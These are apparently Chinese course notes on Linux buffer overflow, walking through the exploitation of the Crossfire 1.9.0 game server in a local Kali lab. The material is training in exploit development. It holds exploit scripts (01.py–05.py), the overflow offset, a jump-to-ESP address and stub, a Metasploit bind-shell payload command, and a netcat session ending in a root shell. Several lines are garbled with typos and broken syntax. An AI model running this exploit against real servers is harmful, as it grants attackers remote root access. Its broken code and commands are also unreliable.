@@ -1,0 +1,377 @@
+课时42 Linux缓冲区溢出
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃FUZZING                                             ┃
+┃Crossfire                                           ┃
+┃    多人在线RPG游戏                                 ┃
+┃    1.9.0版本接受入展socket连接时攒在缓冲区溢出漏洞 ┃
+┃调试工具                                            ┃
+┃    edb                                             ┃
+┃运行平台                                            ┃
+┃    Kali i486虚拟机                                 ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+root@kali:~# cd /usr/games/
+
+root@kali:/usr/games# ls
+crossfire
+
+root@kali:/usr/games#  rm -rf crossfire
+
+root@kali:~# mv crossfie.tar.gz /usr/games/
+
+root@kali:~# cd /usr/games/
+
+root@kali:/usr/games# ls
+crossfire.tar.gz
+
+root@kali:/usr/games# tar zxpf cossfire.tar.gz
+
+root@kali:/usr/games# ls
+crossfile crossfire.tar.gz
+
+root@kali:/usr/games# ls -l
+total 4860
+drwxr-xr-x 8 root root    4096 Feb 10  2010 crossfire
+-rwxrwx--- 1 root root 4968636 Aug 31 09:12 crossfire.tar.gz
+
+root@kali:/usr/games# cd crossfire/
+
+root@kali:/usr/games/crossfire# ls
+bin  etc  lib  man  share  var
+
+root@kali:/usr/games/crossfire# cd bin/
+root@kali:/usr/games/crossfire/bin# ls
+crossedit  crossfire-config  crossloop-pl   player_dl.pl
+crossfire  crossloop         crossloop.web
+
+root@kali:/usr/games/crossfire/bin# ./crossfire
+Unable to open /var/log/crossfire/logfile as the logfile - will use stderr instead
+Couldn't find archetypt horn_waves
+Warning: failed to find arch horn_waves
+Couldn't find treasurelist sarcophagus
+Filed to link treasure to arch (sarcophagus_container): sarcophagus
+Welcome to CrossFile. v1.9.0
+Copyright (C) 1994 Mark Wedel
+Copyright (C) 1992 Frank Tore Johansen.
+
+----------registering SIGPIPE
+Initializing plugins
+Plugins directory is /usr/games/crossfire/lib/crossfir/plugins/
+ -> Loading plugin : cfpython.so
+Error trying to load /usr/games/crossfire/lib/crossfir/plugins/cfpython.so: lib
+python2.5.so.1.0: cannot open shared object file: No such file or directory
+ -> Loading plugin : cfpython.so
+CFAnim 2.0a init
+CFAnim 2.0a post init
+Warting for connections...
+
+逆向工程---->edb-debugger
+             ollydbg
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃FUZZING                                                                       ┃
+┃本机调试                                                                      ┃
+┃    iptables -A INPUT -p tcp --destination-port 4444 \! -d 127.0.0.1 -j DROP  ┃
+┃    iptables -A INPUT -p tcp --destination-port 13327 \! -d 127.0.0.1 -j DROP ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+root@kali:/usr/games/crossfire/bin# iptables -A INPUT -p tcp --destination-port 4444 \! -d 127.0.0.1 -j DROP
+
+root@kali:/usr/games/crossfire/bin# iptables -A INPUT -p tcp --destination-port 13327 \! -d 127.0.0.1 -j DROP
+
+root@kali:/usr/games/crossfire/bin# iptables -L
+Chain INPUT (policy ACCEPT)
+target     prot opt source               destination         
+DROP       tcp  --  anywhere            !localhost            tcp dpt:4444
+DROP       tcp  --  anywhere            !localhost            tcp dpt:13327
+
+Chain FORWARD (policy ACCEPT)
+target     prot opt source               destination         
+
+Chain OUTPUT (policy ACCEPT)
+target     prot opt source               destination         
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃FUZZING                                         ┃
+┃解压                                            ┃
+┃    /usr/games                                  ┃
+┃    tar zxpg crossfire.tar.gz                   ┃
+┃调试                                            ┃
+┃    edb -run /usr/games/crossfire/bin/crossfire ┃
+┃    01.py                                       ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+root@kali:~# edb -run /usr/games/crossfire/bin/crossfire
+Starting edb version: 0.9.20
+Please Report Bugs & Requests At: http://bugs.codef00.com/
+No symbol path specified. Please set it in the preferences to enable symbols.
+NO session path specified, Using current working directory.
+[SessionManager] loading session file: "/root/crossfire.edb" for: "/usr/games/crossfire/bin/crossfire"
+No mian symbol found, calculated it to be "08085ae0" using heuristic
+comparing versions: [2324] [2324]
+No session path specified, Using crrent working directory.
+[SessionManager] saving session file: "/root/crossfire.edb" for: "/usr/games/crossfire/bin/crossfire"
+
+点两次run,变成running
+
+root@kali:~# netstat -pantu | grep 13327
+tcp        0      0 0.0.0.0:13327                                    LISTEN
+3521/crossfire
+root@kali:~# netstat -pantu | grep 13327
+tcp        0      0 0.0.0.0:13327                                    LISTEN
+3521/crossfire
+root@kali:~# netstat -pantu | grep 13327
+tcp        0      0 0.0.0.0:13327                                    LISTEN
+3521/crossfire
+root@kali:~# netstat -pantu | grep 13327
+tcp        0      0 0.0.0.0:13327                                    LISTEN
+3521/crossfire
+root@kali:~# netstat -pantu | grep 13327
+tcp        0      0 0.0.0.0:13327                                    LISTEN
+3521/crossfire
+root@kali:~# netstat -pantu | grep 13327
+tcp        0      0 0.0.0.0:13327                                    LISTEN
+3521/crossfire
+root@kali:~# ps aux | grep 13327
+root      3581  0.0  0.0   3504   1856 pts/2      S+    09:29    0:00 grep 1337
+
+root@kali:~# kill 3521
+
+root@kali:~# netstat -pantu | grep 13327       //运行调试命令
+root@kali:~# netstat -pantu | grep 13327       //打开edb-debugger
+root@kali:~# netstat -pantu | grep 13327       //第一次run
+root@kali:~# netstat -pantu | grep 13327       //第二次run
+tcp        0      0 0.0.0.0:13327                                    LISTEN
+3593/crossfire
+
+╭────────────────────────────────────────────╮
+[01.py]
+#!/usr/bin/python
+import socket
+host = "127.0.0.1"
+crash = "\x41" + 4379
+buffer = "\x11(setup sound" + crash + "\x90\x00#"
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+print "[*]Sending evil buffer..."
+s.connect((host,13327))
+data=s.recv(1024)
+print data
+s.send(buffer)
+s.close()
+print "[*]Payload Sent!"
+╰────────────────────────────────────────────╯
+
+root@kali:~# edb -run /usr/games/crossfire/bin/crossfire
+Starting edb version: 0.9.20
+Please Report Bugs & Requests At: http://bugs.codef00.com/
+No symbol path specified. Please set it in the preferences to enable symbols.
+NO session path specified, Using current working directory.
+[SessionManager] loading session file: "/root/crossfire.edb" for: "/usr/games/crossfire/bin/crossfire"
+No mian symbol found, calculated it to be "08085ae0" using heuristic
+comparing versions: [2324] [2324]
+No session path specified, Using crrent working directory.
+[SessionManager] saving session file: "/root/crossfire.edb" for: "/usr/games/crossfire/bin/crossfire"
+
+点两次run,变成running
+
+root@kali:~# ./01.py
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃FUZZING                                                             ┃
+┃唯一字符串识别EIP精确位置                                           ┃
+┃    /usr/share/metasploit-framework/tools/pattern_create.rb 4379    ┃
+┃    02.py                                                           ┃
+┃    /usr/share/metasploit-framework/tools/pattern_offset.rb 46367046┃
+┃    4368                                                            ┃
+┃    03.py                                                           ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+root@kali:~# cd /usr/share/metasploit-framework/tools/
+root@kali:/usr/share/metasploit-framework/tools# ./pa
+pattern_create.rb    pattern_offset.rb    payload_lengths.rb 
+root@kali:/usr/share/metasploit-framework/tools# ./pattern_create.rb 4379
+
+╭────────────────────────────────────────────╮
+[02.py]
+#!/usr/bin/python
+import socket
+host = "127.0.0.1"
+crash = ' */溢出字符串/*  '
+buffer = "\x11(setup sound" + crash + "\x90\x00#"
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+print "[*]Sending evil buffer..."
+s.connect((host,13327))
+data=s.recv(1024)
+print data
+s.send(buffer)
+s.close()
+print "[*]Payload Sent!"
+╰────────────────────────────────────────────╯
+
+root@kali:~# ./02.py
+[*]Sending evil buffer...
+#version 1023 1027 Crossfire Server
+
+[*]Payload Sent!
+
+root@kali:~# cd /usr/share/metasploit-framework/tools/
+root@kali:/usr/share/metasploit-framework/tools# ./pattern_offset.rb 46367046
+[*] Exact mathc at of set 4368
+
+╭────────────────────────────────────────────╮
+[03.py]
+#!/usr/bin/python
+import socket
+host = "127.0.0.1"
+crash = 'A'*4368 + 'B'*4 + 'C'*7
+#crash = 'A'*4368 + 'B'*4 + '\x83\xc0\xc0\xff\xe0\x90\x90'
+buffer = "\x11(setup sound" + crash + "\x90\x00#"
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+print "[*]Sending evil buffer..."
+s.connect((host,13327))
+data=s.recv(1024)
+print data
+s.send(buffer)
+s.close()
+print "[*]Payload Sent!"
+╰────────────────────────────────────────────╯
+
+root@kali:~# ./03.py
+[*]Sending evil buffer...
+#version 1023 1027 Crossfire Server
+
+[*]Payload Sent!
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃FUZZING                                             ┃
+┃思路：                                              ┃
+┃第一阶段shellcode                                   ┃
+┃    ESP跳转到EAX                                    ┃
+┃    便宜12个字节                                    ┃
+┃setup sound shellcode2                              ┃
+┃/usr/share/metasploit-framework/tools/nasm_shell.rb ┃
+┃    add eax,12                                      ┃
+┃    jmp eax                                         ┃
+┃                                                    ┃
+┃                                                    ┃
+┃\x83\xc0\x0c\xff\xe0\x90\x90                        ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+root@kali:~# cd /usr/share/metasploit-framework/tools/
+root@kali:/usr/share/metasploit-framework/tools# ./nasm_shell.rb
+nasm > add eax,12
+00000000  83C00C             add eax,bytes +0xc
+nasm > jmp eax
+00000000 FFE0                jmp eax
+
+╋━━━━━━━━━━━╋
+┃FUZZING               ┃
+┃查找坏字符            ┃
+┃    \x00\x0a\x0b\x20  ┃
+╋━━━━━━━━━━━╋
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃FUZZING                                                                     ┃
+┃ESP跳转地址                                                                 ┃
+┃    Opcode serach                                                           ┃
+┃    crash="\x41"*4368 + "\x97\x45\x13\x00" + "\x83\xc0\x0c\xff\xe0\x90\x90" ┃
+┃设断点（0x08134597)                                                         ┃
+┃    EIP-----08134597                                                        ┃
+┃    jmp esp                                                                 ┃
+┃    add eax,12                                                              ┃
+┃    jmp eax                                                                 ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃FUZZING                                                         ┃
+┃msfpayload linux/x86/shell_bind_tcp LPORT=4444 R | msfencode -b ┃ 
+┃"\x00\x0a\x0b\x20"                                              ┃
+┃                                                                ┃
+┃                                                                ┃
+┃05.py                                                           ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+
+╭────────────────────────────────────────────╮
+[04.py]
+#!/usr/bin/python
+import socket
+host = "127.0.0.1"
+crash = 'A'*4368 + '\x97\x45\x13\x00' + '\x83\xc0\x0c\xff\xe0\x90\x90'
+#crash = 'A'*4368 + 'B'*4 + '\x83' + '\xc0' + '\xc0' + '\xff' + '\xe0'
+buffer = "\x11(setup sound" + crash + "\x90\x00#"
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+print "[*]Sending evil buffer..."
+s.connect((host,13327))
+data=s.recv(1024)
+print data
+s.send(buffer)
+s.close()
+print "[*]Payload Sent!"
+╰────────────────────────────────────────────╯
+
+
+root@kali:~# ./04.py
+[*]Sending evil buffer...
+#version 1023 1027 Crossfire Server
+
+[*]Payload Sent!
+
+
+root@kali:~# msfpayload linux/x86/shell_bind_tcp LPORT=4444 R | msfencode -b "\x00\x0a\x0b\x20"
+
+
+╭────────────────────────────────────────────╮
+[05.py]
+#!/usr/bin/python
+import socket
+host = "127.0.0.1"
+shellcode = (
+  // 溢出字符串
+)
+
+crash = shellcode + 'A'*(4368-105) + '\x97\x45\x13\x00' + '\x83\xc0\x0c\xff\xe0\x90\x90'
+'
+buffer = "\x11(setup sound" + crash + "\x90\x00#"
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+print "[*]Sending evil buffer..."
+s.connect((host,13327))
+data=s.recv(1024)
+print data
+s.send(buffer)
+s.close()
+print "[*]Payload Sent!"
+╰────────────────────────────────────────────╯
+root@kali:~# cd /usr/share/games/crossfire/bin
+
+root@kali:/usr/share/games/crossfire/bin# ./crossfire
+
+root@kali:~# ./05.py
+[*]Sending evil buffer...
+#version 1023 1027 Crossfire Server
+
+[*]Payload Sent!
+
+root@kali:~# netstat -pantu | grep 4444
+tcp        0      0 0.0.0.0:4444                                     LISTEN
+4300/crossfire
+
+root@kali:~# nc 127.0.0.1 4444
+id
+uid=0(root) gid=0(root) group=0(root)
+ls
+crossedit
+crossfire
+crossfrie-config
+crossloop
+crossloop.pl
+croosloop.web
+player_dl.pl
+pwd
+/usr/games/crossfrie
+
+root@kali:~# find / -name msfpayload
+/usr/share/framework2/msfpayload
+/usr/share/framework2/data/msfpayload
+
